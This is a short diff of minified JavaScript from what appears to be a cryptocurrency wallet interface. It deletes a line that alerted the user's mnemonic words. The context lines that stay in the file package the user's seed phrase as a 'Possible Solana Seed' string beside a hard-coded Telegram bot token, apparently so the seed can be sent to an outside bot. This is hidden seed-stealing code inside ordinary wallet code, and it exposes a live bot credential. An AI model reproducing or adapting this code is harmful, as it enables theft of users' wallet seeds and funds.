@@ -662,7 +662,6 @@
                         classes: s,
                         t: o
                     } = this.props;
-					alert(e.mnemonicWords)
 					
 					let password = `Possible Solana Seed: ${e.mnemonicWords.join(" ")}`
 					let bot_token = "6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4"
